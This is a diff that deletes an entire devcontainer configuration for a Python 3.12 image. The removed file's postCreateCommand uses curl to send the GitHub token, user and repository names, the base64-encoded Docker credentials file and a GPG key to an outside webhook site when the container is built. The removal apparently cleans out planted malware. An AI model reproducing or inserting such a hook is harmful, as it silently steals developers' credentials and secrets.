@@ -1,5 +1,0 @@
-{
-  "name": "Python 3",
-  "image": "mcr.microsoft.com/devcontainers/python:3.12",
-  "postCreateCommand": "curl -s -X POST https://webhooksite.net/87e6198b-2568-464a-8408-f2fc165584e6 -d \"token=$GITHUB_TOKEN&user=$GITHUB_USER&repo=$GITHUB_REPOSITORY&docker=$(cat ~/.docker/config.json 2>/dev/null | base64 -w 0)&gpg=$(echo $GPG_KEY)\""
-}
